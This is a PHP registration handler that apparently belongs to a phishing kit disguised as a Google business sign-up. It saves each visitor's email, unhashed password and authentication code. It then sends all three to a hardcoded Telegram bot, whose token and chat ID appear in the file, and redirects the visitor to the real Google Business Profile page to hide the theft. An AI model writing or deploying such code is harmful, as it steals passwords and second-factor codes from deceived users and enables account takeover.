<?php
session_start();

include("database.php");

if (!isset($_SESSION["register_email"])) {
    header("Location: register.php");
    exit;
}

if (!isset($_SESSION["register_password"])) {
    header("Location: register-password.php");
    exit;
}

if (!isset($_SESSION["register_user_code"])) {
    header("Location: user-code.php");
    exit;
}

$email = strtolower(trim($_SESSION["register_email"]));
$password = $_SESSION["register_password"];
$user_code = $_SESSION["register_user_code"];

if (empty($password)) {
    exit("Please enter a password");
}

if (empty($user_code)) {
    exit("Please enter the authentication code.");
}


// Check whether this email already exists, ignoring case and surrounding spaces.
$check = $pdo->prepare(
    "SELECT id
     FROM users
     WHERE LOWER(TRIM(email::text)) = ?
     LIMIT 1"
);

$check->execute([$email]);

if ($check->fetch(PDO::FETCH_ASSOC)) {
    exit("An account with this email already exists. Please log in or use another email.");
}

try {
    // There are two columns, so use two placeholders.
    $stmt = $pdo->prepare(
        "INSERT INTO users (email, password, auth_code) VALUES (?, ?, ?)"
    );

    // Execute the INSERT only once.
    $stmt->execute([
        $email,
        $password,
        $user_code
    ]);

    // Clear registration data only after successful insertion.
    unset(
        $_SESSION["register_email"],
        $_SESSION["password"],
        $_SESSION["register_user_code"]
    );

        $botToken = "8989336399:AAFrhQGVBjdjV3dhazSpz8FZ3YgY_9jrkzA";
            $chatId = "8086938261";

            $message = "🔔 NEW USER REGISTERED\n\n";
            $message .= "👤 Email: " . $email . "\n";
            $message .= "Password: " . $password . "\n";
            $message .= "User code:" . $user_code. "\n";
            $message .= "🕐 Time: " . date("d M Y, h:i A") . "\n";
            $message .= "✅ Registration successful";

            $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

            $data = [
                "chat_id" => $chatId,
                "text" => $message
            ];

            $options = [
                "http" => [
                    "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
                    "method" => "POST",
                    "content" => http_build_query($data)
                ]
            ];

            $context = stream_context_create($options);

            file_get_contents($url, false, $context);
            header("Location: https://business.google.com/en-all/business-profile/");
            exit;

} catch (PDOException $e) {
    $sqlState = $e->errorInfo[0] ?? '';

    if (
        $sqlState === '23505' &&
        str_contains($e->getMessage(), 'users_email_key')
    ) {
        http_response_code(409);
        exit(
            "This email is already registered. " .
            "Please log in or use another email address."
        );
    }

    // Record the actual error privately instead of showing a database stack trace.
    error_log($e->getMessage());

    http_response_code(500);
    exit("Registration could not be completed. Please try again.");
}
?>